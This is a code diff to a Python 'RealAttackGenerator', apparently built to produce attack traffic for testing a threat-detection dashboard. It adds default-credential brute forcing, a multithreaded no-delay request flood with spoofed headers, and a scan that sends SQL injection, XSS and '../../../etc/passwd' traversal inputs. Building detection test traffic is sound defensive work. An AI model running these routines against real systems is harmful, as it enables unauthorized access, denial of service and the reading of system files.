@@ -64,56 +64,98 @@ class RealAttackGenerator:
             "total_scanned": len(target_ports)
         }
     
-    def brute_force_attack(self, target_port=8001, attempts=10):
-        """Generate real brute force attack traffic"""
+    def brute_force_attack(self, target_port=8001, attempts=15):
+        """Generate real brute force attack against API endpoints"""
         print(f"\n🔐 Starting REAL Brute Force Attack")
         print(f"🎯 Target: {self.target_host}:{target_port}")
         print(f"🔢 Attempts: {attempts}")
         print("=" * 60)
         
-        usernames = ["admin", "root", "user", "administrator", "test", "guest", "demo"]
-        passwords = ["password", "123456", "admin", "root", "password123", "qwerty"]
+        # Common credentials for brute force
+        credentials = [
+            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
+            ("root", "root"), ("root", "password"), ("root", "toor"),
+            ("user", "user"), ("user", "password"), ("user", "123456"),
+            ("administrator", "administrator"), ("administrator", "password"),
+            ("test", "test"), ("guest", "guest"), ("demo", "demo"),
+            ("security", "security"), ("analyst", "analyst")
+        ]
         
         failed_attempts = 0
+        successful_attempts = 0
+        
+        # Target multiple endpoints that require authentication
+        endpoints = [
+            "/api/dashboard/stats",
+            "/api/incidents", 
+            "/api/traffic",
+            "/api/alerts/live",
+            "/admin",
+            "/login"
+        ]
         
         for i in range(attempts):
-            username = random.choice(usernames)
-            password = random.choice(passwords)
+            username, password = random.choice(credentials)
+            endpoint = random.choice(endpoints)
             
             try:
-                print(f"🔑 Attempt {i+1}: {username}:{password} ... ", end="", flush=True)
+                print(f"🔑 Attempt {i+1}: {username}:{password} -> {endpoint} ... ", end="", flush=True)
                 
-                # Try to make HTTP request with basic auth (simulating login)
-                response = requests.get(
-                    f"http://{self.target_host}:{target_port}/api/dashboard/stats",
-                    auth=(username, password),
-                    timeout=2
-                )
-                
-                if response.status_code == 401:
-                    print("❌ FAILED")
-                    failed_attempts += 1
+                # Try different attack methods
+                if endpoint.startswith("/api/"):
+                    # API endpoint with Bearer token attempt
+                    headers = {"Authorization": f"Bearer {password}"}
+                    response = requests.get(
+                        f"http://{self.target_host}:{target_port}{endpoint}",
+                        headers=headers,
+                        timeout=2
+                    )
                 else:
-                    print("✅ SUCCESS (unexpected!)")
+                    # Basic auth attempt
+                    response = requests.get(
+                        f"http://{self.target_host}:{target_port}{endpoint}",
+                        auth=(username, password),
+                        timeout=2
+                    )
+                
+                if response.status_code == 401 or response.status_code == 403:
+                    print("❌ FAILED (Unauthorized)")
+                    failed_attempts += 1
+                elif response.status_code == 404:
+                    print("❌ FAILED (Not Found)")
+                    failed_attempts += 1
+                elif response.status_code == 200:
+                    print("⚠️  SUCCESS (Potential breach!)")
+                    successful_attempts += 1
+                else:
+                    print(f"❓ UNKNOWN ({response.status_code})")
+                    failed_attempts += 1
                     
-            except requests.exceptions.RequestException:
-                print("❌ FAILED (connection error)")
+            except requests.exceptions.RequestException as e:
+                print("❌ FAILED (Connection error)")
                 failed_attempts += 1
             
-            time.sleep(0.5)  # Delay between attempts
+            time.sleep(random.uniform(0.3, 0.8))  # Variable delay to simulate human behavior
         
         print(f"\n📊 Brute Force Results:")
         print(f"   ❌ Failed Attempts: {failed_attempts}")
-        print(f"   📈 Success Rate: {((attempts - failed_attempts) / attempts) * 100:.1f}%")
+        print(f"   ✅ Successful Attempts: {successful_attempts}")
+        print(f"   📈 Success Rate: {(successful_attempts / attempts) * 100:.1f}%")
+        
+        # This attack pattern should trigger threat detection
+        if failed_attempts >= 10:
+            print("🚨 THREAT PATTERN: Multiple failed authentication attempts detected!")
         
         return {
             "attack_type": "BRUTE_FORCE",
             "failed_attempts": failed_attempts,
-            "target_port": target_port
+            "successful_attempts": successful_attempts,
+            "target_port": target_port,
+            "endpoints_targeted": len(endpoints)
         }
     
-    def dos_attack(self, target_port=8001, duration=10):
-        """Generate Denial of Service attack traffic"""
+    def dos_attack(self, target_port=8001, duration=15):
+        """Generate Denial of Service attack traffic against API endpoints"""
         print(f"\n💥 Starting REAL DoS Attack")
         print(f"🎯 Target: {self.target_host}:{target_port}")
         print(f"⏱️  Duration: {duration} seconds")
@@ -121,96 +163,184 @@ class RealAttackGenerator:
         
         start_time = time.time()
         request_count = 0
+        error_count = 0
         
-        def send_requests():
-            nonlocal request_count
+        # Target multiple endpoints to overwhelm the server
+        endpoints = [
+            "/health",
+            "/api/dashboard/stats", 
+            "/api/incidents",
+            "/api/traffic",
+            "/api/alerts/live",
+            "/api/network/devices"
+        ]
+        
+        def send_flood_requests():
+            nonlocal request_count, error_count
             while time.time() - start_time < duration:
                 try:
+                    endpoint = random.choice(endpoints)
+                    
+                    # Send requests with invalid/malformed data to stress the server
+                    headers = {
+                        "Authorization": "Bearer invalid_token_" + str(random.randint(1000, 9999)),
+                        "User-Agent": "AttackBot/1.0",
+                        "X-Forwarded-For": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
+                    }
+                    
                     response = requests.get(
-                        f"http://{self.target_host}:{target_port}/health",
+                        f"http://{self.target_host}:{target_port}{endpoint}",
+                        headers=headers,
                         timeout=1
                     )
                     request_count += 1
-                    if request_count % 10 == 0:
-                        print(f"📡 Sent {request_count} requests...")
-                except:
-                    pass
-                time.sleep(0.1)
+                    
+                    if request_count % 25 == 0:
+                        print(f"📡 Sent {request_count} requests... (Status: {response.status_code})")
+                        
+                except requests.exceptions.RequestException:
+                    error_count += 1
+                except Exception:
+                    error_count += 1
+                
+                # No delay - flood as fast as possible
         
-        # Launch multiple threads for concurrent requests
+        # Launch multiple threads for concurrent flood
         threads = []
-        for i in range(5):  # 5 concurrent threads
-            thread = threading.Thread(target=send_requests)
+        thread_count = 8  # More aggressive than before
+        
+        print(f"🚀 Launching {thread_count} attack threads...")
+        
+        for i in range(thread_count):
+            thread = threading.Thread(target=send_flood_requests)
             thread.start()
             threads.append(thread)
+        
+        # Monitor progress
+        while time.time() - start_time < duration:
+            time.sleep(2)
+            elapsed = time.time() - start_time
+            current_rps = request_count / elapsed if elapsed > 0 else 0
+            print(f"⚡ Attack Progress: {elapsed:.1f}s | {request_count} requests | {current_rps:.1f} RPS")
         
         # Wait for all threads to complete
         for thread in threads:
             thread.join()
         
+        actual_duration = time.time() - start_time
+        rps = request_count / actual_duration if actual_duration > 0 else 0
+        
         print(f"\n📊 DoS Attack Results:")
         print(f"   📡 Total Requests: {request_count}")
-        print(f"   📈 Requests/Second: {request_count / duration:.1f}")
+        print(f"   ❌ Failed Requests: {error_count}")
+        print(f"   ⏱️  Actual Duration: {actual_duration:.1f}s")
+        print(f"   📈 Requests/Second: {rps:.1f}")
+        print(f"   🎯 Endpoints Targeted: {len(endpoints)}")
+        
+        # This should definitely trigger DoS detection
+        if rps > 50:
+            print("🚨 HIGH TRAFFIC PATTERN: DoS attack signature detected!")
         
         return {
             "attack_type": "DOS_ATTACK",
             "total_requests": request_count,
-            "duration": duration,
-            "rps": request_count / duration
+            "error_requests": error_count,
+            "duration": actual_duration,
+            "rps": rps,
+            "endpoints_hit": len(endpoints)
         }
     
     def vulnerability_scan(self):
-        """Scan for common vulnerabilities"""
+        """Scan for common vulnerabilities and test vulnerable endpoints"""
         print(f"\n🔍 Starting REAL Vulnerability Scan")
         print("=" * 60)
         
-        # Common vulnerability endpoints to test
-        vuln_paths = [
-            "/admin",
-            "/login",
-            "/api/users",
-            "/config",
-            "/backup",
-            "/.env",
-            "/database",
-            "/phpmyadmin",
-            "/wp-admin",
-            "/api/v1/users"
+        # Test both API endpoints and vulnerable test app
+        test_targets = [
+            # API Gateway endpoints
+            {"url": f"http://{self.target_host}:8001", "paths": [
+                "/admin", "/login", "/api/users", "/config", "/backup", 
+                "/.env", "/database", "/phpmyadmin", "/wp-admin", 
+                "/api/v1/users", "/swagger", "/docs", "/debug"
+            ]},
+            # Vulnerable test application (if running)
+            {"url": f"http://{self.target_host}:8080", "paths": [
+                "/", "/admin.php", "/login.php", "/config.php",
+                "/?id=1'", "/?name=<script>alert('xss')</script>",
+                "/?file=../../../etc/passwd", "/backup/", "/uploads/"
+            ]}
         ]
         
         found_endpoints = []
+        vulnerabilities = []
         
-        for path in vuln_paths:
-            try:
-                print(f"🔍 Testing {path}... ", end="", flush=True)
-                
-                response = requests.get(
-                    f"http://{self.target_host}:8001{path}",
-                    timeout=2
-                )
-                
-                if response.status_code != 404:
-                    print(f"🟡 FOUND ({response.status_code})")
-                    found_endpoints.append((path, response.status_code))
-                else:
-                    print("🔴 NOT FOUND")
-                    
-            except requests.exceptions.RequestException:
-                print("❌ ERROR")
+        for target in test_targets:
+            base_url = target["url"]
+            paths = target["paths"]
             
-            time.sleep(0.3)
+            print(f"\n🎯 Scanning {base_url}...")
+            
+            for path in paths:
+                try:
+                    print(f"🔍 Testing {path}... ", end="", flush=True)
+                    
+                    response = requests.get(
+                        f"{base_url}{path}",
+                        timeout=3,
+                        allow_redirects=False
+                    )
+                    
+                    if response.status_code == 200:
+                        print(f"🟢 FOUND ({response.status_code})")
+                        found_endpoints.append((base_url, path, response.status_code))
+                        
+                        # Check for specific vulnerability indicators
+                        content = response.text.lower()
+                        if "sql" in content and "error" in content:
+                            vulnerabilities.append(f"SQL Error in {path}")
+                        if "script" in content and "alert" in content:
+                            vulnerabilities.append(f"XSS Vulnerability in {path}")
+                        if "root:" in content or "/etc/passwd" in content:
+                            vulnerabilities.append(f"Directory Traversal in {path}")
+                            
+                    elif response.status_code == 403:
+                        print(f"🟡 FORBIDDEN ({response.status_code})")
+                        found_endpoints.append((base_url, path, response.status_code))
+                    elif response.status_code == 401:
+                        print(f"🟡 AUTH REQUIRED ({response.status_code})")
+                        found_endpoints.append((base_url, path, response.status_code))
+                    elif response.status_code == 500:
+                        print(f"🔴 SERVER ERROR ({response.status_code})")
+                        found_endpoints.append((base_url, path, response.status_code))
+                        vulnerabilities.append(f"Server Error in {path} - Potential vulnerability")
+                    else:
+                        print("🔴 NOT FOUND")
+                        
+                except requests.exceptions.RequestException:
+                    print("❌ ERROR")
+                
+                time.sleep(0.2)  # Small delay between requests
         
         print(f"\n📊 Vulnerability Scan Results:")
         if found_endpoints:
             print("   🟡 Found Endpoints:")
-            for path, status in found_endpoints:
-                print(f"      {path} (HTTP {status})")
+            for base_url, path, status in found_endpoints:
+                print(f"      {base_url}{path} (HTTP {status})")
         else:
-            print("   🟢 No obvious vulnerabilities found")
+            print("   🟢 No obvious endpoints found")
+            
+        if vulnerabilities:
+            print("   🚨 Potential Vulnerabilities:")
+            for vuln in vulnerabilities:
+                print(f"      ⚠️  {vuln}")
+        else:
+            print("   🛡️  No obvious vulnerabilities detected")
         
         return {
             "attack_type": "VULN_SCAN",
-            "found_endpoints": found_endpoints
+            "found_endpoints": found_endpoints,
+            "vulnerabilities": vulnerabilities,
+            "targets_scanned": len(test_targets)
         }
 
 def main():
